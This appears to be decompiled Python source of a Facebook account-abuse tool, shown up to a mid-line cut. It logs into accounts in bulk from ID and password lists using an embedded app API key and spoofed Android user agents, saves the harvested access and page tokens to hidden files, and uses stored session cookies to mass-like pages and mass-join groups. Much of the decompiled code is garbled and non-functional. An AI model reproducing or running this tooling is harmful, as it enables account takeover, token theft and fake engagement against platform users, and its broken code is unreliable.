    print(f'''{green}  METHOD 1 {white}---> {yellow}EXTRACT NORMAL ACCOUNT PAGES''')
    line()
    ids = input(f'''{yellow}  Enter Facebook ID: {green}''')
    line()
    pas = input(f'''{yellow}  Enter Facebook Password: {green}''')
    line()
    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
    fbbv = str(random.randint(111111111, 999999999))
    fbrv = '0'
    random_seed = random.Random()
    adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
    ua_bgraph = f'''[FBAN/FB4A;FBAV/{str(random.randint(49, 66))}.0.0.{str(random.randrange(20, 49))}{str(random.randint(11, 99))};FBBV/{str(random.randint(11111111, 77777777))};[FBAN/FB4A;FBAV/{fbav};FBPN/com.facebook.katana;FBLC/pt_BR;FBBV/{fbbv};FBCR/CLARO BR;FBMF/Xiaomi;FBBD/Redmi;FBDV/M1908C3JGG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{{density=2.75,width=1080,height=2216}};FB_FW/1;FBRV/470765339;] FBBK/1'''
    data = {
        'locale': 'en_SV',
        'client_country_code': 'SV',
        'fb_api_req_friendly_name': 'authenticate',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
    head = {
        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
    url = 'https://graph.facebook.com/auth/login'
    po = requests.post(url, data = data, headers = head).json()
    if 'session_key' in po:
        poo = po.get('access_token', '')
        token = str(poo)
        for i in { }:
            cookie = i['value']
            i = i['name']
            return get_facebook_pages_with_token(token)
            print(f'''  {red}ACCOUNT : {yellow}{ids} {white}---> {red}{po}''')
            return None
            po.get('session_cookies', [])
            i = 'True'
            if Exception:
                e = 'X-FB-Server-Cluster'
                print(f'''Error: {e}''')
                e = None
                del e
                return None
                e = None
                del e

import requests
import random
import string
import uuid

def get_facebook_account():
    clear()
    logo()
    print(f'''\t\t{green} TOTAL ACTIVE ACCOUNTS''')
    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
    line()
    print(f'''{green}  METHOD 2 {white}---> {yellow}EXTRACT SINGLE NORMAL ACCOUNT''')
    line()
    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
    print(f'''{yellow}  [1] {blue}ON YOUR RPA LIST''')
    print(f'''{yellow}  [2] {blue}ON YOUR FRA LIST''')
    print(f'''{yellow}  [3] {blue}ON YOUR RPA PAGES LIST''')
    print(f'''{yellow}  [4] {blue}ON YOUR FRA PAGES LIST''')
    print(f'''{red}  [0] {red}RETURN''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1':
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '2':
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '3':
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
    if account_choose == '4':
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
    if account_choose == '0':
        start_tool()
        return None
    print('Invalid choice')
    return None
    uid = input(f'''{yellow}  Enter Facebook ID: {green}''')
    line()
    pas = input(f'''{yellow}  Enter Facebook Password: {green}''')
    line()
    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
    fbbv = str(random.randint(111111111, 999999999))
    fbrv = '0'
    random_seed = random.Random()
    adid = ''.join(random_seed.choices(string.hexdigits, k = 16))
    ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/FB4A;FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1080,height=2107};FBLC/fr_FR;FBRV/' + fbrv + ';FBCR/Ooredoo TN;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    data = {
        'locale': 'en_SV',
        'client_country_code': 'SV',
        'fb_api_req_friendly_name': 'authenticate',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
    head = {
        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
    url = 'https://graph.facebook.com/auth/login'
    po = requests.post(url, headers = head, data = data).json()
    if 'session_key' in po:
        cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
        poo = po.get('access_token', '')
        token = str(poo)
        open('/sdcard/.EXTRACT-COOKIE-ACCOUNT-NAME-ID.txt', 'a').write('')
        print(f'''  {white}ID : {yellow}{uid} {white}---> {green}Successfully Extract!''')
        open(check_path, 'a').write(uid + '\n')
        open(path_file, 'a').write('%s\n' % poo)
        return None
    print(f'''  {red}ACCOUNT : {yellow}{uid} {white}---> {red}{po}''')
    return None
    if Exception:
        e = ';'.join
        print(f'''{red}  An error occurred!''')
        e = None
        del e
        return None
        e = None
        del e

ok = []
checkpoint = []
loop = 0
import uuid
import requests
import random
import sys
from concurrent.futures import ThreadPoolExecutor as thread

def bgraph_bulk_account():
    clear()
    logo()
    print(f'''\t\t{green} TOTAL ACTIVE ACCOUNTS''')
    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
    line()
    print(f'''{green}  METHOD 3 {white}---> {yellow}EXTRACT BULK NORMAL ACCOUNTS M1''')
    print(f'''{red}  File Format : {green}uid|password''')
    line()
    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
    print(f'''{yellow}  [1] {blue}ON YOUR RPA LIST''')
    print(f'''{yellow}  [2] {blue}ON YOUR FRA LIST''')
    print(f'''{yellow}  [3] {blue}ON YOUR RPA PAGES LIST''')
    print(f'''{yellow}  [4] {blue}ON YOUR FRA PAGES LIST''')
    print(f'''{red}  [0] {red}RETURN''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1':
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '2':
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '3':
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
    if account_choose == '4':
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
    if account_choose == '0':
        start_tool()
        return None
    print('Invalid choice')
    return None
    filee = input(f'''{yellow}  Input File Path : {green}''')
    line()
    boost(filee)
    fo = open(filee, 'r').read().splitlines()
    cook = thread(max_workers = 5)
    for i in None:
        (uid, pw) = i.split('|')
        cook.submit(graph, uid, pw, path_file, check_path)
        None(None, None)
        return None
        if FileNotFoundError:
            print(f'''{red}  File Not Found''')
            slp(5)
            main()
    if not None:
        pass


def graph(uid, pw, path_file, check_path):
    global loop
    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    data = {
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32' }
    simm3 = random.choice([
        'GLOBE',
        'SMART'])
    headers = '62f8ce9f74b12f84c123cc23437a4a32'
    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
    po = requests.post(url, headers = headers, data = data).json()
    if 'session_key' in po:
        cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
        poo = po.get('access_token', '')
        token = str(poo)
        open('/sdcard/.EXTRACT-COOKIE-ACCOUNT-NAME-ID.txt', 'a').write('')
        if uid in open(check_path, 'r').read():
            print(f'''{red}  Account Already Exist in Tool {yellow}---> {red}{uid}''')
            line()
        print(f'''  {white}ID : {yellow}{uid} {white}---> {green}Successfully Extract!''')
        line()
        open(check_path, 'a').write(uid + '\n')
        open(path_file, 'a').write('%s\n' % poo)
        ok.append(uid)
    print(f'''  {red}ACCOUNT : {yellow}{uid} {white}---> {red}{po}''')
    loop += 1
    return None
    if Exception:
        e = ';'.join
        print(f'''{red}  An error occurred!''')
        e = None
        del e
        e = None
        del e


def get_facebook_pages_with_token3(uid, poo, path_file, check_path):
    url = 'https://graph.facebook.com/v18.0/me/accounts'
    headers = {
        'Authorization': f'''Bearer {poo}''',
        'User-Agent': W_ueragnt() }
    response = requests.get(url, headers = headers)
    if response.status_code != 200:
        print(f'''  {red}ACCOUNT : {red}{uid} {white}---> {red}Failed!''')
        line()
        return None
    data = response.json()
    for page in []:
        pages_data = data['data'][{
            'accessToken': page['access_token'],
            'id': page['id'],
            'name': page['name'] }]
        page = data['data']
        total_accounts = 0
        new_accounts = 0
        print(f'''  {white}ACCOUNT : {yellow}{uid}{white} ---> Total pages extracted: ''', end = ' ')
        file = open(check_path, 'r')
        existing_pages = file.readlines()
        for line in {}:
            existing_page_ids = line.strip().split('|')[0]
            line = existing_pages
            None(None, None)
            for page in pages_data:
                pages_access_token = page['accessToken']
                pages_name = page['name']
                pages_id = page['id']
                if None in pages_id:
                    print(f'''\n{red}  Pages Already Exist in Tool{yellow}---> {red}''' + pages_id + '|' + pages_name)
                new_accounts += 1
                total_accounts += 1
                file = open(check_path, 'a')
                file.write(pages_id + '|' + pages_name + '\n')
                None(None, None)
                file = open(path_file, 'a')
                file.write(pages_access_token + '\n')
                None(None, None)
                print(f'''{green}[{total_accounts}]''')
                line()
                return pages_data
                page = None
                line = None
                if not None:
                    pass
    if FileNotFoundError:
        existing_page_ids = set()
    if not None:
        pass
    if Exception:
        e = None
        print(f'''{red}  Error writing: {e}''')
        e = None
        del e
        e = None
        del e
    if not None:
        pass
    if Exception:
        e = None
        print(f'''{red}  Error writing: {e}''')
        e = None
        del e
        e = None
        del e


def bgraph_bulk_pages():
    clear()
    logo()
    print(f'''\t\t{green} TOTAL ACTIVE ACCOUNTS''')
    count_lines_in_files(path_file1, path_file2, path_file3, path_file4)
    line()
    print(f'''{green}  METHOD 5 {white}---> {yellow}EXTRACT BULK ACCOUNTS PAGES''')
    print(f'''{red}  File Format : {green}uid|password''')
    line()
    print(f'''{white}  CHOOSE WHERE TO SAVE:''')
    print(f'''{yellow}  [1] {blue}ON YOUR RPA LIST''')
    print(f'''{yellow}  [2] {blue}ON YOUR FRA LIST''')
    print(f'''{yellow}  [3] {blue}ON YOUR RPA PAGES LIST''')
    print(f'''{yellow}  [4] {blue}ON YOUR FRA PAGES LIST''')
    print(f'''{red}  [0] {red}RETURN''')
    line()
    account_choose = input(f'''{yellow}  Choose : {green}''')
    line()
    if account_choose == '1':
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '2':
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-ACCOUNTS-NAME-ID.txt'
    if account_choose == '3':
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-RPA-PAGES-NAME-ID.txt'
    if account_choose == '4':
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt', 'a').write('')
        open('/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt', 'a').write('')
        path_file = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES.txt'
        check_path = '/sdcard/.EXTRACT-TOKEN-FRA-PAGES-NAME-ID.txt'
    if account_choose == '0':
        start_tool()
        return None
    print('Invalid choice')
    return None
    line
    filee = input(f'''{yellow}  Input File Path : {green}''')
    line()
    boost(filee)
    fo = open(filee, 'r').read().splitlines()
    cook = thread(max_workers = 10)
    for i in None:
        (uid, pw) = i.split('|')
        cook.submit(graph4, uid, pw, path_file, check_path)
        None(None, None)
        return None
        if FileNotFoundError:
            print(f'''{red}  File Not Found''')
            slp(5)
            main()
    if not None:
        pass


def graph4(uid, pw, path_file, check_path):
    fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
    fbbv = str(random.randint(111111111, 999999999))
    fbrv = '0'
    random_seed = random.Random()
    adid = ''.join(random_seed.choices(string.hexdigits, k = 16))
    pas = pw
    ua_bgraph = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';' + '[FBAN/Orca-Android;FBAV/' + fbav + ';FBPN/com.facebook.orca;FBLC/en_PH;FBBV/' + fbbv + ';FBCR/GLOBE;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;] FBBK/1'
    data = {
        'locale': 'en_SV',
        'client_country_code': 'SV',
        'fb_api_req_friendly_name': 'authenticate',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
    head = {
        'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
    url = 'https://graph.facebook.com/auth/login'
    po = requests.post(url, headers = head, data = data).json()
    if 'session_key' in po:
        cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
        poo = po.get('access_token', '')
        token = str(poo)
        return get_facebook_pages_with_token3(uid, token, path_file, check_path)
    'True'(f'''  {red}ACCOUNT : {yellow}{uid} {white}---> {red}{po}''')
    line()
    return None
    if Exception:
        e = 'X-FB-Server-Cluster'
        print(f'''{red}  An error occurred!''')
        e = None
        del e
        return None
        e = None
        del e


def graph2(uid, pw, path_file, check_path):
    global loop
    accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    pas = pw
    data = {
        'method': 'auth.login',
        'fb_api_req_friendly_name': 'authenticate',
        'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        'api_key': '62f8ce9f74b12f84c123cc23437a4a32' }
    simm3 = random.choice([
        'GLOBE',
        'SMART',
        'TNT',
        'TM'])
    headers = '62f8ce9f74b12f84c123cc23437a4a32'
    url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
    po = requests.post(url, headers = headers, data = data).json()
    if 'session_key' in po:
        cookie = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
        poo = po.get('access_token', '')
        token = str(poo)
        return get_facebook_pages_with_token3(uid, token, path_file, check_path)
    loop += 1
    return None
    if Exception:
        e = 'x-fb-connection-token'
        print(f'''An error occurred: {e}''')
        e = None
        del e
        e = None
        del e


def linex():
    print('\x1b[1;32m ───────────────────────────────────────────────────────')


def p_like():
    clear()
    logo()
    ses = requests.Session()
    cookies_file_path = input(f'''{yellow}  File Path  : {green}''')
    linex()
    i_user_values = []
    c_user_values = []
    file = open(cookies_file_path, 'r')
    lines = file.read().splitlines()
    for line in lines:
        cookie_pairs = line.split(';')
        for pair in cookie_pairs:
            key_value = pair.split('=', 1)
            if not len(key_value) == 2:
                pass
            (key, value) = key_value
            key = key.strip()
            value = value.strip()
            if key == 'i_user':
                i_user_values.append(value)
            if not key == 'c_user':
                pass
            c_user_values.append(value)
            None(None, None)
            if i_user_values:
                pass
    ids_to_use = c_user_values
    if not ids_to_use:
        print(f'''{red}  No i_user or c_user values found in cookies.''')
        return None
    print(f'''{yellow}  Example : {green} 61550760441899''')
    page_ids = input(f'''{yellow}  Input Target Page UID : {green}''')
    linex()
    limitx = int(input(f'''{yellow}  Quantity : {green}'''))
    linex()
    headersccc['user-agent'] = W_ueragnt()
    mbasic_url = f'''https://mbasic.facebook.com/{page_ids}'''
    if i_user_values:
        pass
    first_line = ''
    for pair in []:
        if not '=' in pair:
            pass
        pair = first_line.strip().split(';')[pair]
        cokix = '; '.join(first_line.strip().split(';'))
        reqx = bs(ses.get(mbasic_url, headers = headersccc, cookies = {
            'cookie': cokix }).content, 'html.parser')
        reqxx = reqx.find_all('a', string = 'Message')
        print(f'''{yellow}  Example : {green} 112079428655706''')
        d_pa_id = input(f'''{yellow}  Input Page ID : {green}''')
        linex()
        for tag in reqxx:
            href = tag.get('href', '')
            if not '/messages/thread/' in href:
                pass
            d_pa_id = href.split('/messages/thread/')[1].split('/')[0]
            lines[0]
            if not d_pa_id:
                print(f'''{red}  Unable to extract d_pa_id.''')
                return None
    clear()
    logo()
    print(f'''{yellow}  Total Page : {green}{len(ids_to_use)}''')
    print(f'''{yellow}  Target     : {green}{page_ids}''')
    linex()
    executor = ThreadPoolExecutor(max_workers = 10)
    for i in range(min(len(ids_to_use), limitx)):
        pageid = ids_to_use[i]
        if i < len(lines):
            pass
        line = ''
        for pair in []:
            if not '=' in pair:
                pass
            pair = line.strip().split(';')[pair]
            cokix = '; '.join(line.strip().split(';'))
            if i_user_values:
                uidx = pageid
                cookies_page = {
                    'cookie': cokix }
        uidx = pageid
        cookies_page = {
            'cookie': cokix }
        executor.submit(likepage, cookies_page, pageid, page_ids, d_pa_id)
        None(None, None)
        return None
        if not lines[i]:
            pass
    if FileNotFoundError:
        print(f'''{red}  File Not Found''')
        sleep(3)
        return None
    pair = None
    if Exception:
        e = None
        print(f'''Error fetching page: {e}''')
        e = None
        del e
        return None
        e = None
        del e
    pair = None
    if Exception:
        e = None
        print(f'''{red}  FAILED: {e}''')
        f = open('failed.txt', 'a', encoding = 'utf8')
        f.write(f'''{cokix}\n''')
        None(None, None)
        if not None:
            pass
        e = None
        del e
        e = None
        del e
    if not None:
        pass


def likepage(cookies_page, pageid, page_ids, d_pa_id):
    headers['user-agent'] = W_ueragnt()
    web_url = f'''https://www.facebook.com/profile.php?id={page_ids}'''
    req = bs(ses.get(web_url, headers = headers, cookies = cookies_page).content, 'html.parser')
    uidx = re.search('__user=(.*?)&', str(req)).group(1)
    dpr = re.search('"pr":(.*?),', str(req)).group(1)
    fb_dtsg = re.search('"DTSGInitialData",\\[\\],{"token":"(.*?)"}', str(req)).group(1)
    jazoest = re.search('&jazoest=(.*?)"', str(req)).group(1)
    lsd = re.search('"LSD",\\[\\],{"token":"(.*?)"}', str(req)).group(1)
    data_post = {
        'av': uidx,
        'dpr': dpr,
        'fb_dtsg': fb_dtsg,
        'jazoest': jazoest,
        'lsd': lsd,
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'CometProfilePlusLikeMutation',
        'variables': f'''{{"input":{{"is_tracking_encrypted":false,"page_id":{d_pa_id!s},"source":null,"tracking":null,"actor_id":{uidx!s},"client_mutation_id":"1"}},"scale":1}}''',
        'server_timestamps': 'true',
        'doc_id': '6716077648448761' }
    response = ses.post('https://www.facebook.com/api/graphql/', cookies = cookies_page, headers = headers, data = data_post)
    if response.status_code == 200:
        data = response.json()
        subscribe_status = data['data']['page_like']['page']['subscribe_status']
        done.append(pageid)
        print(f'''{white}  [{len(done)}] {green}Page Like and Follow Done : {white} {pageid} ''')
        linex()
        return None
    print(f'''{red}  Failed to like page: {response.status_code}''')
    linex()
    return None
    if Exception:
        e = None
        print(f'''{red}  Failed: {e}''')
        linex()
        e = None
        del e
        return None
        e = None
        del e

done = []

def linex():
    print('\x1b[1;32m ───────────────────────────────────────────────────────')


def convert_to_traodoisub(url):
    response = requests.post('https://id.traodoisub.com/api.php', data = {
        'link': url })
    if response.status_code == 200:
        result = response.json().get('id')
        return result
    if Exception:
        e = None
        print(f'''{red}  An error occurred: {e}''')
        e = None
        del e
        return None
        e = None
        del e


def g_join():
    clear()
    logo()
    cookies_file_path = input(f'''{yellow}  File Path  : {green}''')
    linex()
    i_user_values = []
    c_user_values = []
    cookies_lines = []
    file = open(cookies_file_path, 'r')
    lines = file.read().splitlines()
    for line in lines:
        cookies_lines.append(line.strip())
        cookie_pairs = line.split(';')
        for pair in cookie_pairs:
            key_value = pair.split('=', 1)
            if not len(key_value) == 2:
                pass
            (key, value) = key_value
            key = key.strip()
            value = value.strip()
            if key == 'i_user':
                i_user_values.append(value)
            if not key == 'c_user':
                pass
            c_user_values.append(value)
            None(None, None)
            if i_user_values:
                pass
    ids_to_use = c_user_values
    if not ids_to_use:
        print(f'''{red}  No i_user or c_user values found in cookies.''')
        return None
    group_url = input(f'''{yellow}  Input Group URL : {green}''')
    linex()
    group_id = convert_to_traodoisub(group_url)
    if not group_id:
        print(f'''{red}  Failed to convert URL to group ID.''')
        return None
    limitx = int(input(f'''{yellow}  Quantity : {green}'''))
    linex()
    clear()
    logo()
    print(f'''{yellow}  Total Accounts: {green}{len(ids_to_use)}''')
    print(f'''{yellow}  Group ID : {green}{group_id}''')
    linex()
    executor = ThreadPoolExecutor(max_workers = 10)
    for i in range(min(len(ids_to_use), limitx)):
        pageid = ids_to_use[i]
        if i < len(cookies_lines):
            pass
        line = ''
        page_uidz = f'''i_user={pageid}'''
        for pair in []:
            if not '=' in pair:
                pass
            pair = line.strip().split(';')[pair]
            cokix = '; '.join(line.strip().split(';'))
            cookies_page = {
                'cookie': cokix + '; ' + page_uidz }
            executor.submit(g_joining, cookies_page, pageid, group_id)
            linex()
            None(None, None)
            return None
            if not cookies_lines[i]:
                pass
    i_user_values
    if FileNotFoundError:
        print(f'''{red}  File Not Found''')
        sleep(3)
        return None
    pair = None
    if not None:
        pass


def g_joining(cookies_page, pageid, group_id):
    ses = requests.Session()
    use_link = f'''https://www.facebook.com/groups/{group_id}'''
    headers = {
        'user-agent': W_ueragnt() }
    req = ses.get(use_link, headers = headers, cookies = cookies_page)
    req_content = req.content
    req_parsed = bs(req_content, 'html.parser')
    av = re.search('__user=(.*?)&', str(req_content)).group(1)
    data = {
        'av': av,
        'dpr': re.search('"pr":(.*?),', str(req_content)).group(1),
        'fb_dtsg': re.search('"DTSGInitialData",\\[\\],{"token":"(.*?)"}', str(req_content)).group(1),
        'jazoest': re.search('&jazoes